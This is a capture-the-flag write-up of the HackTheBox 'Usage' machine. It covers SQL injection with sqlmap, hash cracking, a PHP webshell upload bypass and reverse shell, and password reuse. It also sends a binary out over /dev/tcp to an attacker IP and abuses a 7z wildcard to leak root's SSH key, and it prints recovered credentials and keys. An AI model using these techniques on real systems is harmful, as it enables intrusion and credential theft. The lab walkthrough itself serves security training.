---
render_with_liquid: false
title: HackTheBox Writeup  Usage
date: 2024-04-15 16:21:50 +1400
tags: [hackthebox, nmap, linux, feroxbuster, gobuster, php, sqli, sqli-boolean-blind, sqlmap, hashcat, file-upload, file-upload-bypass, webshell, discover-secrets, password-reuse, sudo, reversing, ghidra, wildcards, 7zip, file-read]
---




# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ pt init '10.129.120.40 usage.htb admin.usage.htb Usage'
+---------+--------+---------------+-----------------+
| PROFILE | STATUS |      IP       |     DOMAIN      |
+---------+--------+---------------+-----------------+
| usage   | on     | 10.129.120.40 | usage.htb       |
| usage   | on     | 10.129.120.40 | admin.usage.htb |
| usage   | on     | 10.129.120.40 | Usage           |
+---------+--------+---------------+-----------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Mon Apr 15 16:21:50 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, Usage
Nmap scan report for Usage (10.129.120.40)
Host is up, received user-set (0.22s latency).
Scanned at 2024-04-15 16:21:50 CST for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0=
|   256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Apr 15 16:22:04 2024 -- 1 IP address (1 host up) scanned in 13.85 seconds
```

## 80 - HTTP : Blog


### Info

```ruby
http://usage.htb [200] [Daily Blogs] [nginx/1.18.0 (Ubuntu)] [Bootstrap:4.1.3,Laravel,Nginx:1.18.0,PHP,Ubuntu] [cff187328e7d78b1ceda606b18b4d02678829984]
```

![](/assets/obsidian/0ec768be57c3fb7410a5e3ad06819e45.png)

### Directory

```bash
feroxbuster -k -t 100 -u "http://$(pt get rhost)" -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ cat ferox_80.txt | awk '$1!=503'
405      GET       24l      116w     1009c http://usage.htb/post-login
200      GET      264l      247w     5112c http://usage.htb/registration
200      GET      265l      244w     5141c http://usage.htb/
```

### Subdomains

```bash
gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -k -t 100 -u http://$(pt get rhost)
```

```bash
Found: admin.usage.htb Status: 200 [Size: 3304]
```

## 80 - admin.usage.htb : Admin login page


### Info

```ruby
http://admin.usage.htb/ [200] [Admin | Login] [nginx/1.18.0 (Ubuntu)] [Bootstrap,Laravel,Nginx:1.18.0,PHP,Ubuntu] [27d7e272bd3079ef6baae6527afe108fa7b31e3e]
```

![](/assets/obsidian/4173a4d2c83d96f7575d4c76a595bdf1.png)

### Directory

```bash
feroxbuster -k -t 100 -u "http://admin.$(pt get rhost)" -o ferox_80-admin.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ cat ferox_80-admin.txt | awk '$1!=503'
302      GET       12l       22w      402c http://admin.usage.htb/admin => http://admin.usage.htb/admin/auth/login
200      GET       88l      226w     3304c http://admin.usage.htb/admin/auth/login
200      GET        7l     2518w    91082c http://admin.usage.htb/vendor/laravel-admin/AdminLTE/dist/css/AdminLTE.min.css
200      GET       88l      226w     3304c http://admin.usage.htb/
```

# User Flag
---

## Shell as xander


### 80 - Password reset : SQLI (Boolean-based blind)


#### Identify

> http://usage.htb/forget-password

I've registered a user with email `a@a.com`

Below is the result after requesting a password reset for `a@a.com`

![](/assets/obsidian/eb8a3ffcc1ae3253eeecb028266d7d43.png)

Below is the result after requesting a password reset for an invalid email

![](/assets/obsidian/065b4f63f13e217200ce6fa2a0a2d8da.png)

It still return success by using the email : `a@a.com'#---`, which indicates the `email` parameter is vulnerable to SQLI

![](/assets/obsidian/6505b321358ab294633a49f446e15391.png)

![](/assets/obsidian/ca127852cb97f60688079699156c48dd.png)

#### Sqlmap

Save the request from burp proxy history

> `pass_reset.req`

```bash
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6Imk5a1Y3dFdReFc1ZXlxSnVEU1hPNnc9PSIsInZhbHVlIjoiMHJ6aHFrUXlUdnk5UUdpYllLTVdRVEZzdnpIcU4xOUs1N2lxaUpWTUxseW42dTRzcy9IRW53WFpsMkZ5UWtOSmZlUkh4VWF0T1ErWE42SDgvVkhjeFNNMFlMQ0dqbTZqMDgvbnJyWVZDMFlQR2NzQXVvdzNKbHpLTDNZL3kxNzciLCJtYWMiOiI0OWY4NjkyOGMyYjkyNGUxYTZkNGU4MWQ4ZGZiMGRmMWIyZGUxYjVlZjQ2ZmI1YjViODMwNzgzNjI4OGJjNDY2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkFMcFhmeVM5cCt4eDRQZ3lodlpXT2c9PSIsInZhbHVlIjoiTzdpdld5a0JTWFcwN0F0K3BjRDNodklBM0tXSkd1ZEduYXZTWmRxcEk2YjdJS0QydmpvcHd6Q0xtQjZPczR0dGd1cnc3ZVlIaHdWcnltVXlkNHhwL216c3lselRKbHZNUG5DK0Z4WDRKWElCTjlxSFhXVXl5d3JFSUtZWmFHazIiLCJtYWMiOiI0ZTc5MGQyNmQ2Y2M4NjdiYmI2OTNjNmEyN2ZmMTM3Zjc2MDdlZDI1OWYyNjZkYWEyZjA2YzRjZjdkYjRlOTRlIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

_token=nOo5nERbEsRmyjVAbSL0uz564mhvHV8VxcTOWtFR&email=a%40a.com 
```

Run **sqlmap**

```bash
sqlmap --random-agent -r pass_reset.req --threads 10 -p email --batch --os linux --level 5 --risk 3
```

```bash
sqlmap identified the following injection point(s) with a total of 739 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=nOo5nERbEsRmyjVAbSL0uz564mhvHV8VxcTOWtFR&email=a@a.com' AND 8975=(SELECT (CASE WHEN (8975=8975) THEN 8975 ELSE (SELECT 4121 UNION SELECT 8433) END))-- wRYY

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: _token=nOo5nERbEsRmyjVAbSL0uz564mhvHV8VxcTOWtFR&email=a@a.com' AND 3445=BENCHMARK(5000000,MD5(0x4962637a))-- QApP
---
[19:19:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL < 5.0.12
```

#### Enumerate database

- Current user

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ sqlmap --random-agent -r pass_reset.req --threads 10 -p email --batch --os linux --level 5 --risk 3 --current-user
[...]
current user: 'staff@localhost'
[...]
```

- Databases

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ sqlmap --random-agent -r pass_reset.req --threads 10 -p email --batch --os linux --level 5 --risk 3 --dbs
[...]
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
[...]
```

- Tables in `usage_blog` database

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ sqlmap --random-agent -r pass_reset.req --threads 10 -p email --batch --os linux --level 5 --risk 3 -D usage_blog --tables
[...]
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+
[...]
```

- Dump `email` and `password` from `users` table

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ sqlmap --random-agent -r pass_reset.req --threads 10 -p email --batch --os linux --level 5 --risk 3 -D usage_blog -T users --columns
[...]
Database: usage_blog
Table: users
[8 columns]
+-------------------+-----------------+
| Column            | Type            |
+-------------------+-----------------+
| name              | varchar(255)    |
| created_at        | timestamp       |
| email             | varchar(255)    |
| email_verified_at | timestamp       |
| id                | bigint unsigned |
| password          | varchar(255)    |
| remember_token    | varchar(100)    |
| updated_at        | timestamp       |
+-------------------+-----------------+
[...]
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ sqlmap --random-agent -r pass_reset.req --threads 10 -p email --batch --os linux --level 5 --risk 3 -D usage_blog -T users -C email,password --dump
[...]
+---------------+--------------------------------------------------------------+
| email         | password                                                     |
+---------------+--------------------------------------------------------------+
| a@a.com       | $2y$10$0yG9lRwI2rdtY9RrBP7DVu1SS011zYN59lYNnU2KoGAZNFe2NgO.G |
| raj@raj.com   | $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4. |
| raj@usage.htb | $2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa |
+---------------+--------------------------------------------------------------+
[...]
```

- Dump `email` and `password` from `admin_users` table

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ sqlmap --random-agent -r pass_reset.req --threads 10 -p email --batch --os linux --level 5 --risk 3 -D usage_blog -T admin_users --columns
[...]
Database: usage_blog
Table: admin_users
[8 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| name           | varchar(255) |
| avatar         | varchar(255) |
| created_at     | timestamp    |
| id             | int unsigned |
| password       | varchar(60)  |
| remember_token | varchar(100) |
| updated_at     | timestamp    |
| username       | varchar(190) |
+----------------+--------------+
[...]
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ sqlmap --random-agent -r pass_reset.req --threads 10 -p email --batch --os linux --level 5 --risk 3 -D usage_blog -T admin_users -C username,password --dump
[...]
Database: usage_blog
Table: admin_users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
+----------+--------------------------------------------------------------+
[...]
```

### Crack hashes from admin_users table

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ cat /home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_users.csv | tail -n +2 | sed '/^$/d' | awk -F',' '{print $1":"$2}' > sqlmap_admin_users.hash

┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ hashcat sqlmap_admin_users.hash /opt/wordlists/rockyou.txt --user -m 3200
[...]
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
[...]
```

### 80 - dmin.usage.htb : PHP webshell file upload bypass

> http://admin.usage.htb/

- Logged in with creds : `admin:whatever1`

![](/assets/obsidian/c95a113727628f3d42a113aa4150d16b.png)

![](/assets/obsidian/9a1fff68ab479f6635de47f35b3f4694.png)

I can upload avatar at `settings` page

![](/assets/obsidian/1c2948646374ac8a3d79e6c690ef65e6.png)

If I upload a `php` file, it will show `Only "image" files are supported.`

![](/assets/obsidian/256ee2d1145fe03fa076b79af8e54da0.png)

Generate a dummy jpg file

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ convert -size 100x100 xc:white white_100x100.jpg
```

![](/assets/obsidian/6143ea7de8a11479dcfe8d9482c0b964.png)

By uploading the legit `jpg` file and intercept request, I changed file extension to `.php` and added `<?php phpinfo();?>` at the end of the file content. It was successfully uploaded

![](/assets/obsidian/8476a6cc3457a830493080a022981095.png)

Looking at burp proxy history, I know the uploaded `php` file located at `/uploads/images/white_100x100.php`, and `phpinfo()` did work

![](/assets/obsidian/2b7f2397e8e28e9915da7cd2f5ea107a.png)

There was no `disable_functions` defined, so I can upload a reverse shell right away

> Reverse shell source : https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php

![](/assets/obsidian/19b715008ed6db177f60e1d0a061de95.png)

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.32] from (UNKNOWN) [10.129.120.40] 43976
SOCKET: Shell has connected! PID: 81148
/usr/bin/script -qc /bin/bash /dev/null
dash@usage:/var/www/html/project_admin/public/uploads/images$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/www]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
<ject_admin/public/uploads/images$ export TERM=xterm
ns 209sage:/var/www/html/project_admin/public/uploads/images$ stty rows 50 column
dash@usage:/var/www/html/project_admin/public/uploads/images$ id
uid=1000(dash) gid=1000(dash) groups=1000(dash)
dash@usage:/var/www/html/project_admin/public/uploads/images$ cat ~/user.txt
179a18fca36f2103cbb216495a1544b7
```

- Since the webshell gets removed by a script constantly, we can add our ssh keys to `~/authorized_keys` to persist access

# Root Flag
---

## From dash to xander


### Enumeration

```bash
dash@usage:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
dash:x:1000:1000:dash:/home/dash:/bin/bash
xander:x:1001:1001::/home/xander:/bin/bash
```

```bash
dash@usage:~$ ls -latr
total 52
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rwx------ 1 dash dash  707 Oct 26 04:49 .monitrc
-rw-r--r-- 1 dash dash   32 Oct 26 04:50 .monit.id
lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
-rw-r----- 1 root dash   33 Apr 11 13:42 user.txt
-rw------- 1 dash dash 1192 Apr 15 12:58 .monit.state
-rw-r--r-- 1 dash dash    6 Apr 15 12:58 .monit.pid
drwxr-x--- 6 dash dash 4096 Apr 15 12:58 .
```

I don't see any files that was potentially **timestomped**, but `.monit*` files that was recently modified looks interesting

```bash
dash@usage:~$ find -L ~ -type f -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -printf "%T@ %Tc %p\n" 2>/dev/null | sort -n
[...]
1692240219.7643606150 Thu 17 Aug 2023 02:43:39 AM UTC /home/dash/.cache/composer/repo/https---repo.packagist.org/packages.json
1692240219.9363515150 Thu 17 Aug 2023 02:43:39 AM UTC /home/dash/.cache/composer/repo/https---repo.packagist.org/provider-doctrine~dbal~dev.json
1692880230.9507464440 Thu 24 Aug 2023 12:30:30 PM UTC /home/dash/.ssh/id_rsa
1692880230.9507464440 Thu 24 Aug 2023 12:30:30 PM UTC /home/dash/.ssh/id_rsa.pub
1698295772.6666883460 Thu 26 Oct 2023 04:49:32 AM UTC /home/dash/.monitrc
1698295842.5426366370 Thu 26 Oct 2023 04:50:42 AM UTC /home/dash/.monit.id
1712842945.7280034540 Thu 11 Apr 2024 01:42:25 PM UTC /home/dash/user.txt
1713185775.2023727630 Mon 15 Apr 2024 12:56:15 PM UTC /home/dash/.ssh/authorized_keys
1713189038.9064714780 Mon 15 Apr 2024 01:50:38 PM UTC /home/dash/.monit.state
1713189040.9624715400 Mon 15 Apr 2024 01:50:40 PM UTC /home/dash/.monit.pid
```

There's a password `3nc0d3d_pa$$w0rd` in `.monitrc`

```bash
dash@usage:~$ cat .monitrc

#Monitoring Interval in Seconds
set daemon  60


#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd


#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert



#System Monitoring
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```

### Password reuse

```bash
dash@usage:~$ su - xander
Password:3nc0d3d_pa$$w0rd
xander@usage:~$ id
uid=1001(xander) gid=1001(xander) groups=1001(xander)
```

## From xander to root


### SUDO - Custom C binary

```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

```bash
xander@usage:~$ ls -la /usr/bin/usage_management
-rwxr-xr-x 1 root root 16312 Oct 28 07:22 /usr/bin/usage_management
xander@usage:~$ file /usr/bin/usage_management
/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
```

Test out the binary

```bash
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
```

Transfer the binary for further reverse engineering

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ nc -lvnp 443 > usage_management
```

```bash
xander@usage:~$ cat /usr/bin/usage_management > /dev/tcp/10.10.14.32/443
```

### Reverse engineer usage_management binary

Load the binary into **ghidra**

![](/assets/obsidian/b3a0242895816eb9536e52978245347c.png)

- `3. Reset admin password` just prints "Password has been reset"

![](/assets/obsidian/e493b2b2c7bfdeac07106a779bfa4cea.png)

- `2. Backup MySQL data` uses `mysqldump` with full path to export mysql database

![](/assets/obsidian/d3fcafab912a0816b4b5645f4b2ce605.png)

I've found a new hash from `admin_operation_log`, but the cleartext password was just `admin`

![](/assets/obsidian/4bb06c64e7f372c9aadf4757ba2ca2cd.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ hashcat tmp.hash /opt/wordlists/rockyou.txt -m 3200
[...]
$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde/WQMKnAQ7k2HJK:admin
[...]
```

- `3. Project Backup` uses `7z` to backup the folder `/var/www/html` with wildcard in the arguments, which means we can specify arbitrary arguments by creating files at `/var/www/html`

```c
void backupWebContent(void)
{
  int iVar1;
  
  iVar1 = chdir("/var/www/html");
  if (iVar1 == 0) {
    system("/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *");
  }
  else {
    perror("Error changing working directory to /var/www/html");
  }
  return;
}
```

### SUDO - Custom C binary : Abuse wildcards in 7z command to read root's ssh private key

> Reference : https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z

Try to read `root`'s ssh private key

```bash
xander@usage:~$ cd /var/www/html/
xander@usage:/var/www/html$ touch @root.id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa root.id_rsa
```

```bash
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--
Path = /var/backups/project.zip
Type = zip
Physical Size = 54829757

Scanning the drive:

WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----

2984 folders, 17946 files, 113879410 bytes (109 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 20930


Files read from disk: 17946
Archive size: 54829908 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7
```

Reformat the key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ cat root.id_rsa.txt
-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files

┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ cat root.id_rsa.txt | sed 's/ : No more files//g' > root.id_rsa
```

SSH as root

```bash
┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ chmod 600 root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Usage]
└─$ ssh -i root.id_rsa root@$(pt get rhost)
root@usage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@usage:~# cat /root/root.txt
1bbbf88e851c42e54665c8b057558657
```

# Additional
---
